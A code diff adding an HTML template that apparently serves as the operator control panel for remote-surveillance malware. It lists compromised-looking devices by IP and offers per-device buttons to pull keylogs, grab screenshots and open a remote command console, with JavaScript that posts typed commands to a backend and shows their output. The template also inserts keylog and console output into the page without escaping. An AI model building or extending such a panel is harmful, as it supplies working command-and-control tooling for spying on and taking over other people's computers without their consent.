@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard Control Panel</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/static/styles.css">
+</head>
+<body class="dark-theme bg-black">
+    <nav class="navbar bg-black">
+        <div class="nav-brand">
+            <h2>Control Panel</h2>
+        </div>
+        <div class="hamburger">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </div>
+        <div class="nav-menu">
+            <ul class="nav-list">
+                <li class="nav-item">
+                    <a href="#" class="nav-link active">
+                        <i class="fas fa-desktop me-2"></i>
+                        <span>Devices</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-keyboard me-2"></i>
+                        <span>Keylogs</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-camera me-2"></i>
+                        <span>Screenshots</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-cog me-2"></i>
+                        <span>Settings</span>
+                    </a>
+                </li>
+            </ul>
+            <div class="nav-right">
+                <div class="user-info">
+                    <i class="fas fa-bell me-3"></i>
+                    <i class="fas fa-user-circle"></i>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+            <!-- Main Content -->
+            <main class="main-content">
+                
+                <div id="funcutils" class="mb-3 d-flex">
+                    <div class="search-box">
+                        <i class="fas fa-search"></i>
+                        <input type="text" id="deviceSearch" class="form-control" placeholder="Search devices...">
+                    </div>
+                    <div class="btn-group me-2">
+                        <button type="button" id="toggleView" class="btn btn-primary">
+                            <i class="fas fa-th-large me-2"></i>
+                        </button>
+                    </div>
+
+                </div>
+            
+
+                <!-- Device Grid -->
+                <div id="deviceGrid" class="row g-4">
+                    {% for device in devices %}
+                    <div class="col-12 col-sm-6 col-xl-4">
+                        <div class="card device-card h-100" data-device-id="{{ device.id }}">
+                            <div class="card-body">
+                                <div class="device-header d-flex justify-content-between align-items-center mb-3">
+                                    <h5 class="card-title mb-0">{{ device.name }}</h5>
+                                    <span class="badge status {{ device.status }}">{{ device.status }}</span>
+                                </div>
+                                <div class="device-info mb-3 text-white">
+                                    <p class="mb-2"><i class="fas fa-microchip me-2"></i> CPU: {{ device.cpu_usage }}%</p>
+                                    <p class="mb-2"><i class="fas fa-memory me-2"></i> RAM: {{ device.ram_usage.used }}GB/{{ device.ram_usage.total }}GB</p>
+                                    <p class="mb-2"><i class="fas fa-clock me-2"></i> Uptime: {{ device.uptime }}</p>
+                                    <p class="mb-2"><i class="fas fa-network-wired me-2"></i> IP: {{ device.ip_address }}</p>
+                                </div>
+                                <div class="device-actions d-grid gap-2 d-flex">
+                                    <button class="btn btn-primary" onclick="getKeylogs('{{ device.id }}')">
+                                        <i class="fas fa-keyboard me-2"></i> Keylogs
+                                    </button>
+                                    <button class="btn btn-success" onclick="getScreenshot('{{ device.id }}')">
+                                        <i class="fas fa-camera me-2"></i> Screenshot
+                                    </button>
+                                    <button class="btn btn-danger" onclick="openConsole('{{ device.id }}')">
+                                        <i class="fas fa-terminal me-2"></i> Console
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+
+                <!-- Device List -->
+                <div id="deviceList" class="table-responsive" style="display: none;">
+                    <table class="table table-dark table-hover">
+                        <thead>
+                            <tr>
+                                <th>Status</th>
+                                <th>Name</th>
+                                <th>CPU</th>
+                                <th>RAM</th>
+                                <th>Uptime</th>
+                                <th>IP</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for device in devices %}
+                            <tr>
+                                <td><span class="badge status {{ device.status }}">{{ device.status }}</span></td>
+                                <td>{{ device.name }}</td>
+                                <td>{{ device.cpu_usage }}%</td>
+                                <td>{{ device.ram_usage.used }}GB/{{ device.ram_usage.total }}GB</td>
+                                <td>{{ device.uptime }}</td>
+                                <td>{{ device.ip_address }}</td>
+                                <td>
+                                    <div class="btn-group">
+                                        <button class="btn btn-sm btn-primary" onclick="getKeylogs('{{ device.id }}')">
+                                            <i class="fas fa-keyboard"></i>
+                                        </button>
+                                        <button class="btn btn-sm btn-success" onclick="getScreenshot('{{ device.id }}')">
+                                            <i class="fas fa-camera"></i>
+                                        </button>
+                                        <button class="btn btn-sm btn-danger" onclick="openConsole('{{ device.id }}')">
+                                            <i class="fas fa-terminal"></i>
+                                        </button>
+                                    </div>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div class="modal fade" id="modal" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content bg-dark">
+                <div class="modal-header border-secondary">
+                    <h5 class="modal-title" id="modalTitle">Console - Device</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body" id="modalContent"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <script>
+        // Hamburger menu toggle with improved animations
+        const hamburger = document.querySelector('.hamburger');
+        const navbar = document.querySelector('.navbar');
+        const navItems = document.querySelectorAll('.nav-item');
+        
+        hamburger.addEventListener('click', (e) => {
+            e.stopPropagation(); // Prevent document click from immediately closing
+            navbar.classList.toggle('active');
+        });
+
+        // Close menu when clicking outside
+        document.addEventListener('click', (e) => {
+            if (!navbar.contains(e.target) && navbar.classList.contains('active')) {
+                navbar.classList.remove('active');
+            }
+        });
+
+        // Prevent menu from closing when clicking inside
+        navbar.addEventListener('click', (e) => {
+            e.stopPropagation();
+        });
+
+        // Add smooth transitions for nav items
+        function updateNavItemDelays() {
+            navItems.forEach((item, index) => {
+                item.style.transitionDelay = navbar.classList.contains('active') 
+                    ? `${0.15 + (index * 0.1)}s`
+                    : '0s';
+            });
+        }
+
+        // Update transitions on menu toggle
+        navbar.addEventListener('transitionend', (e) => {
+            if (e.propertyName === 'transform' && !navbar.classList.contains('active')) {
+                navItems.forEach(item => {
+                    item.style.transitionDelay = '0s';
+                });
+            }
+        });
+
+        hamburger.addEventListener('click', updateNavItemDelays);
+        // Initialize Bootstrap Modal
+        const modal = new bootstrap.Modal(document.getElementById('modal'));
+        
+        // Search functionality
+        document.getElementById('deviceSearch').addEventListener('input', function(e) {
+            const searchTerm = e.target.value.toLowerCase();
+            const devices = document.querySelectorAll('.device-card');
+            
+            devices.forEach(device => {
+                const deviceName = device.querySelector('.card-title').textContent.toLowerCase();
+                const col = device.closest('.col-12');
+                if (deviceName.includes(searchTerm)) {
+                    col.style.display = 'block';
+                } else {
+                    col.style.display = 'none';
+                }
+            });
+        });
+
+        // Toggle view functionality
+        const toggleViewButton = document.getElementById('toggleView');
+        const deviceGrid = document.getElementById('deviceGrid');
+        const deviceList = document.getElementById('deviceList');
+
+        toggleViewButton.addEventListener('click', () => {
+            if (deviceGrid.style.display === 'none') {
+                deviceGrid.style.display = 'flex';
+                deviceList.style.display = 'none';
+                toggleViewButton.innerHTML = '<i class="fas fa-list me-2"></i>Switch to List View';
+            } else {
+                deviceGrid.style.display = 'none';
+                deviceList.style.display = 'block';
+                toggleViewButton.innerHTML = '<i class="fas fa-th-large me-2"></i>Switch to Grid View';
+            }
+        });
+
+        // API functions
+        function showError(message) {
+            document.getElementById('modalTitle').textContent = 'Error';
+            document.getElementById('modalContent').innerHTML = `
+                <div class="alert alert-danger">
+                    <i class="fas fa-exclamation-circle me-2"></i>
+                    ${message}
+                </div>
+            `;
+            modal.show();
+        }
+
+        async function getKeylogs(deviceId) {
+            try {
+                const response = await fetch(`/api/devices/${deviceId}/keylog`);
+                const data = await response.json();
+                
+                if (!response.ok) {
+                    throw new Error(data.error || 'Failed to fetch keylogs');
+                }
+                
+                document.getElementById('modalTitle').textContent = `Keylogs - Device ${deviceId}`;
+                document.getElementById('modalContent').innerHTML = `
+                    <pre class="bg-dark text-light p-3 rounded">${data.logs}</pre>
+                    <p class="text-muted mt-2">Timestamp: ${new Date(data.timestamp).toLocaleString()}</p>
+                `;
+                modal.show();
+            } catch (error) {
+                console.error('Error fetching keylogs:', error);
+                showError(error.message);
+            }
+        }
+
+        async function getScreenshot(deviceId) {
+            try {
+                const response = await fetch(`/api/devices/${deviceId}/screenshot`);
+                const data = await response.json();
+                
+                if (!response.ok) {
+                    throw new Error(data.error || 'Failed to fetch screenshot');
+                }
+                
+                document.getElementById('modalTitle').textContent = `Screenshot - Device ${deviceId}`;
+                document.getElementById('modalContent').innerHTML = `
+                    <img src="${data.screenshot_url}" alt="Device Screenshot" class="img-fluid rounded">
+                    <p class="text-muted mt-2">Timestamp: ${new Date(data.timestamp).toLocaleString()}</p>
+                `;
+                modal.show();
+            } catch (error) {
+                console.error('Error fetching screenshot:', error);
+                showError(error.message);
+            }
+        }
+
+        async function openConsole(deviceId) {
+            document.getElementById('modalTitle').textContent = `Console - Device ${deviceId}`;
+            document.getElementById('modalContent').innerHTML = `
+                <div class="console-container bg-black p-3 rounded">
+                    <div id="consoleOutput" class="console-output mb-3"></div>
+                    <div class="input-group">
+                        <input type="text" id="commandInput" class="form-control bg-dark text-light" placeholder="Enter command...">
+                        <button class="btn btn-primary" onclick="sendCommand('${deviceId}')">Send</button>
+                    </div>
+                </div>
+            `;
+            modal.show();
+        }
+
+        async function sendCommand(deviceId) {
+            const commandInput = document.getElementById('commandInput');
+            const command = commandInput.value;
+            
+            if (!command) return;
+
+            try {
+                const response = await fetch(`/api/devices/${deviceId}/console`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ command }),
+                });
+                
+                const data = await response.json();
+                const consoleOutput = document.getElementById('consoleOutput');
+                
+                consoleOutput.innerHTML += `
+                    <div class="console-entry mb-2">
+                        <span class="text-primary">> ${data.command}</span>
+                        <span class="text-light d-block ps-3">${data.output}</span>
+                    </div>
+                `;
+                
+                commandInput.value = '';
+                consoleOutput.scrollTop = consoleOutput.scrollHeight;
+            } catch (error) {
+                console.error('Error sending command:', error);
+            }
+        }
+
+        // Auto-refresh device status
+        function updateDeviceStatus() {
+            const devices = document.querySelectorAll('.device-card');
+            devices.forEach(async device => {
+                const deviceId = device.dataset.deviceId;
+                try {
+                    const response = await fetch(`/api/devices/${deviceId}/status`);
+                    const data = await response.json();
+                    
+                    const statusElement = device.querySelector('.status');
+                    statusElement.className = `badge status ${data.status}`;
+                    statusElement.textContent = data.status.charAt(0).toUpperCase() + data.status.slice(1);
+                } catch (error) {
+                    console.error('Error updating device status:', error);
+                }
+            });
+        }
+
+        // Update status every 30 seconds
+        setInterval(updateDeviceStatus, 30000);
+    </script>
+</body>
+</html>
